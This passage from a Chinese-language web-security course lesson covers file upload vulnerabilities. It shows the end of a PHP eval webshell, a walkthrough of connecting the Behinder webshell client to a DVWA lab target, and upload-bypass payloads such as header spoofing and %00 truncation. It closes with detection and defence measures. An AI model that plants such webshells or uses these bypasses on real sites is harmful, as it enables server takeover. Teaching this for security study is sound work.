<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#24292E;">    $arr</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">explode</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;|&#39;</span><span style="color:#24292E;">,$post);</span></span>
<span class="line"><span style="color:#24292E;">    $func</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$arr[</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">    $params</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$arr[</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">C</span><span style="color:#24292E;">{</span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__invoke</span><span style="color:#24292E;">($p) {</span><span style="color:#005CC5;">eval</span><span style="color:#24292E;">($p</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;&quot;</span><span style="color:#24292E;">);}}</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">@</span><span style="color:#005CC5;">call_user_func</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">C</span><span style="color:#24292E;">(),$params);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>上传成功后得到地址：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/shell.php</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/shell.php</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>使用以下命令打开冰蝎客户端：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">java </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">jar Behinder_v3.</span><span style="color:#FDAEB7;font-style:italic;">0_Beta6_linux</span><span style="color:#E1E4E8;">.jar</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">java </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">jar Behinder_v3.</span><span style="color:#B31D28;font-style:italic;">0_Beta6_linux</span><span style="color:#24292E;">.jar</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>右击菜单选择&quot;新增&quot;，把 shell.php 地址输入 URL，同时输入 shell.php 中的连接密码（此处我使用默认密码&quot;rebeyond&quot;），点击&quot;保存&quot;。</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6E/CgpVE2AOpVGASgILAAF0TN6o8cU323.png" alt="图片5.png"></p><p>双击保存的 URL 去连接 shell.php，如果成功的话，会打开 phpinfo，同时在右上角显示&quot;已连接&quot;。</p><p><img src="https://s0.lgstatic.com/i/image/M00/91/7B/Ciqc1GAOpWeAOjNkAAIfIjLZ0Y0133.png" alt="图片6.png"></p><p>上面有很多附带功能，你可以管理服务器文件：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6B/Cip5yGAOpYGAMOzZAAKQwoGuNvo092.png" alt="图片7.png"></p><p>可以执行命令：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6E/CgpVE2AOpZKAKj6EAAGxJFxWHbw029.png" alt="图片8.png"></p><p>还有数据库管理、执行自定义代码以及内网穿透时常用的端口映射、Socks 隧道等等功能。</p><p>之前使用&quot;菜刀&quot;的人比较多，也导致不少网站增加了对其的检测规则，后来不少人改用通信加密与设置连接密码的&quot;冰蝎&quot;，也有人基于此做了二次开发，做一些检测特征清除，从而绕过一些安全系统的查杀。</p><p><strong>最后再提醒下，本文提及的相关工具仅限安全研究学习之用，请勿用于任何非法途径，否则后果自负。</strong></p><h3 id="绕过上传限制" tabindex="-1">绕过上传限制 <a class="header-anchor" href="#绕过上传限制" aria-label="Permalink to &quot;绕过上传限制&quot;">​</a></h3><h4 id="_1-禁用-js" tabindex="-1">1.禁用 JS <a class="header-anchor" href="#_1-禁用-js" aria-label="Permalink to &quot;1.禁用 JS&quot;">​</a></h4><p>很多时候，开发在限制上传文件格式时，仅是在前端 JS 上做简单的文件后缀名判断，若不是就中断处理。对于这种情况安装个 NoScript 插件，禁用 JS 再上传即可绕过。</p><h4 id="_2-篡改数据包" tabindex="-1">2.篡改数据包 <a class="header-anchor" href="#_2-篡改数据包" aria-label="Permalink to &quot;2.篡改数据包&quot;">​</a></h4><p>对于前端 JS 的限制，除了禁用 JS 外，我们还可以使用 curl、nc、BurpSuite 等工具构造数据包去发送请求，这样是不经过浏览器前端 JS 的处理，从而绕过限制。这里的篡改内容，可依据前端 JS 的校验内容来定，比如后缀名、Content-type 等等。</p><h4 id="_3-文件头绕过" tabindex="-1">3.文件头绕过 <a class="header-anchor" href="#_3-文件头绕过" aria-label="Permalink to &quot;3.文件头绕过&quot;">​</a></h4><p>不同文件格式有不同的文件头，比如下表：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6C/Cip5yGAOphaAXf44AAExycN6r9o883.png" alt="图片9.png"></p><p>这样我们就可以尝试在 php 文件前面加个图片文件头，看是否可以绕过检测，比如下面 shell.php 内容：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">BM </span><span style="color:#F97583;">&lt;?</span><span style="color:#E1E4E8;">php </span><span style="color:#B392F0;">phpinfo</span><span style="color:#E1E4E8;">(); </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">BM </span><span style="color:#D73A49;">&lt;?</span><span style="color:#24292E;">php </span><span style="color:#6F42C1;">phpinfo</span><span style="color:#24292E;">(); </span><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>从这也可以看出，检测文件格式最后是文件头＋后缀名都一块检测，否则仍有绕过的可能。</p><h4 id="_4-00-截断" tabindex="-1">4.%00 截断 <a class="header-anchor" href="#_4-00-截断" aria-label="Permalink to &quot;4.%00 截断&quot;">​</a></h4><p>前端限制对防御上传漏洞的能力相对是比较弱的，更多还是得靠服务端，但如果限制不当，仍有可能绕过。比如对文件后缀、路径上的检测，有时可通过添加 ％00 截断来绕过，比如：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">upload.php</span><span style="color:#F97583;">?</span><span style="color:#E1E4E8;">type</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">image</span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">file</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">shell.php</span><span style="color:#F97583;">%</span><span style="color:#79B8FF;">00</span><span style="color:#E1E4E8;">.jpg</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">upload.php</span><span style="color:#D73A49;">?</span><span style="color:#24292E;">type</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">image</span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">file</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">shell.php</span><span style="color:#D73A49;">%</span><span style="color:#005CC5;">00</span><span style="color:#24292E;">.jpg</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h4 id="_5-大小写绕过" tabindex="-1">5.大小写绕过 <a class="header-anchor" href="#_5-大小写绕过" aria-label="Permalink to &quot;5.大小写绕过&quot;">​</a></h4><p>有时检测未区分文件名大小写时，可使用此方法绕过。</p><h4 id="_6-后缀别名绕过" tabindex="-1">6.后缀别名绕过 <a class="header-anchor" href="#_6-后缀别名绕过" aria-label="Permalink to &quot;6.后缀别名绕过&quot;">​</a></h4><p>有些执行脚本存在多个后缀别名，若网站对此检测不全时，也有可能绕过，不同语言的常用后缀如下表：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6C/Cip5yGAOpiiAcqiXAAEw44DP0TU466.png" alt="图片10.png"></p><p>html 文件上传后可用于 XSS 或者钓鱼欺骗等攻击，相比其他语言可直接在服务端执行代码的危害低一些，但仍要重视。</p><h4 id="_7-结合其他漏洞绕过" tabindex="-1">7.结合其他漏洞绕过 <a class="header-anchor" href="#_7-结合其他漏洞绕过" aria-label="Permalink to &quot;7.结合其他漏洞绕过&quot;">​</a></h4><p>可利用一些服务器的解析漏洞来绕过，比如利用 apache 对不同后缀名的处理顺序机制，当后缀名不可识别时，就往左判断，比如 shell.php.php123 有可能被识别为 php 类型来执行。</p><p>nginx 也出现过类似漏洞，比如 1.jpg/1.php 被当作 php 来执行，这种服务端解析漏洞就比较难单纯依靠网站代码来解决，前提还是需要先堵住漏洞。</p><h3 id="如何发现上传漏洞" tabindex="-1">如何发现上传漏洞 <a class="header-anchor" href="#如何发现上传漏洞" aria-label="Permalink to &quot;如何发现上传漏洞&quot;">​</a></h3><h4 id="_1-黑盒扫描" tabindex="-1">1.黑盒扫描 <a class="header-anchor" href="#_1-黑盒扫描" aria-label="Permalink to &quot;1.黑盒扫描&quot;">​</a></h4><p>在日常的网站扫描中，一般不会上传真实的木马，常常使用 phpinfo 来代替，这样对业务的影响是最小的。有时也会 echo 一段字符串来代替，但这种有时被外部发现，又可能被外部炒作被黑，存在公关风险。</p><p>当爬虫网页时，若发现存在文件上传功能，就自动构造请求上传包含以下代码的文件：</p><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">phpinfo</span><span style="color:#E1E4E8;">(); </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">phpinfo</span><span style="color:#24292E;">(); </span><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>先根据返回包特征判断是否上传成功，然后再去寻找上传路径。扫描器可以设置一个随机文件名，然后再常见目录去检测是否上传成功。</p><p>如果是自家服务器，你倒可以在服务器上布署个文件创建的监控，然后根据文件名获取上传路径，最后访问文件路径判断是否可访问。这种做法的通用相对比较差，很多时候也并不是对自己服务器的测试。</p><h4 id="_2-流量监测" tabindex="-1">2.流量监测 <a class="header-anchor" href="#_2-流量监测" aria-label="Permalink to &quot;2.流量监测&quot;">​</a></h4><p>由于黑盒扫描对上传文件路径的确认比较困难，所以流量监测成为一种常用方法，不仅是上传漏洞，其实其他漏洞也同样适用的。</p><p>通过监测流量中疑似的 webshell，获取相关请求数据告警出来，然后再人工确认，我们在用这种方法在实际业务中多次发现上传漏洞。</p><h4 id="_3-白盒审计" tabindex="-1">3.白盒审计 <a class="header-anchor" href="#_3-白盒审计" aria-label="Permalink to &quot;3.白盒审计&quot;">​</a></h4><p>如果手上有源代码，直接审计代码也是一种不错方式。在 PHP 中是通过 $_FILE 来读取文件，它拥有以下几个常用属性：</p><ul><li><p>$_FILES[file][&#39;name&#39;]：上传文件名</p></li><li><p>$_FILES[file][&#39;tmp_name&#39;]：存储在服务器的文件的临时副本的名称</p></li><li><p>$_FILES[file][&#39;size&#39;]：上传文件大小</p></li><li><p>$_FILES[file][&#39;type&#39;]：上传文件类型</p></li></ul><p>其中的 name 与 tmp_name 可以理解为污染源触发上传文件存储的函数常见于：move_uploaded_file，审计代码时就可以先从此函数入手，看其参数是否有来源于上述污染源数据，并且中间无任何的上传限制，那就有可能存在上传漏洞，最后再手工上传验证下。</p><h3 id="漏洞防御" tabindex="-1">漏洞防御 <a class="header-anchor" href="#漏洞防御" aria-label="Permalink to &quot;漏洞防御&quot;">​</a></h3><p>对于上传漏洞的修复和防御，可以从以下几方面入手：</p><p><strong>1</strong>. 严格检测上传文件后缀名、文件头、Content-type，尽量采用白名单方式限制。</p><p><strong>2</strong>. 重编码文件，比如对图片或视频做转换处理。</p><p><strong>3</strong>. 限制文件大小，避免被恶意上传大文件造成存储空间不足，进而网站无法正常运行。</p><p><strong>4</strong>. 在服务端本地检测 Webshell，发现后告警出来，人工确认后再删除，同时排查是否为外部入侵导致的，查日志去追踪可能存在的漏洞来源。</p><p><strong>5</strong>. 使用 WAF 拦截木马的上传，这种可能比较容易被绕过。</p><p><strong>6</strong>. 使用 RASP 在服务端中对于执行脚本的关键函数进行 hook，比如 php eval，在触发外部数据输入执行时就告警和阻断。</p><p><strong>7</strong>. 限制上传目录可不解析，不同的服务器有不同的配置方式，比如 Nginx 可按如下方式配置。</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">  location </span><span style="color:#F97583;">~*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">^/</span><span style="color:#E1E4E8;">uploads</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">.</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">\\.(php</span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">php5)$ </span></span>
<span class="line"><span style="color:#E1E4E8;">  {</span></span>
<span class="line"><span style="color:#E1E4E8;">    deny all;</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">  location </span><span style="color:#D73A49;">~*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">^/</span><span style="color:#24292E;">uploads</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">.</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">\\.(php</span><span style="color:#D73A49;">|</span><span style="color:#24292E;">php5)$ </span></span>
<span class="line"><span style="color:#24292E;">  {</span></span>
<span class="line"><span style="color:#24292E;">    deny all;</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>8</strong>. 上传文件重命名，建议使用随机文件名。</p><p><strong>9</strong>. 隐藏上传文件路径相关信息，比如关闭错误回显，不要像本课中的 DVWA 靶场的题目那样直接把上传路径直接返回。</p><h3 id="小结" tabindex="-1">小结 <a class="header-anchor" href="#小结" aria-label="Permalink to &quot;小结&quot;">​</a></h3><p>本节课主要介绍文件上传漏洞的成因、利用、检测与防御，也简单介绍了一句话木马、常用 Webshell 工具，同时重点介绍了一些绕过上传限制的常用技巧。</p><p>在实际渗透测试过程中，你需要结合业务实际场景来灵活运用，最好是摸清网站的一些限制策略，再做测试用例上的调整，这样才会比较适用。</p><p>下一讲开始，我将会介绍&quot;命令注入&quot;漏洞，这也是一种常见的严重漏洞，严重到需要企业安全人员半夜起来加班应急。我将介绍命令注入漏洞的成因、常见的利用技巧，并会总结一些常见的限制绕过方法，以及漏洞挖掘与防御的主流方式，所以别忘来听课～</p><hr><p><a href="https://wj.qq.com/s2/8059116/3881/" target="_blank" rel="noreferrer">课程评价入口，挑选 5 名小伙伴赠送小礼品～</a></p>`,112),e=[o];function t(r,c,i,E,y,d){return a(),n("div",null,e)}const b=s(l,[["render",t]]);export{u as __pageData,b as default};
